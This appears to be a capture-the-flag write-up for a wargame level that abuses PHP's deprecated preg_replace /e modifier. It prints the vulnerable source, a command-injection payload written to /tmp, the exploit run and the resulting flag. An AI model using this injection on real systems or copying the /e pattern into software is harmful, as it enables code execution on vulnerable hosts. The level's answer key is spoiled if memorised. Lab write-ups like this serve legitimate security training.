# Level06

### Tools


### How to solve it

1. After loging in using ssh in level06@(vmIP): 
```
ssh level06@000.000.000.000 -p 4242
```
2. When loging we type ls -l and we have two files:
```
level06 ->Executable
level06.php - > Source code
```
3. If you check the code we have this:
```
#!/usr/bin/php
<?php

function y($m) {
//Searches for dots and exchange then for 'x'. then @ for y
$m = preg_replace("/\./", " x ", $m);
$m = preg_replace("/@/", " y", $m);
return $m;
}

function x($y, $z) {
//It reads the content of the file(the code we will execute).
//Then it replace some texts, but the '/e' has a security breach
//It can execute a malicious code that is fixed in recent PHP versions
$a = file_get_contents($y);
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
$a = preg_replace("/\[/", "(", $a);
$a = preg_replace("/\]/", ")", $a);
return $a;
}
//It will execute x function with 2 arguments.
$r = x($argv[1], $argv[2]);
print $r;

?>
```
4. After analyzing this code we get to the breach on /e and then we have to insert a malicious code to get the flag there.
```
[x (command)]
```
5. Then we have to send the getflag command to an file so it will be read in level06 executable
```
echo '[x ${`getflag`}]' > /tmp/flagargv
```
6. No we just execute the main file with the flagcode argument.
```
./level06 /tmp/flagargv
```
7. And Boom:
```
wiok45aaoguiboiki2tuin6ub
```
### How to protect
 - Once someone is inside your system and if you do not monitor it it's because you failed before,  one additional proction would be implemeting passwords in important files

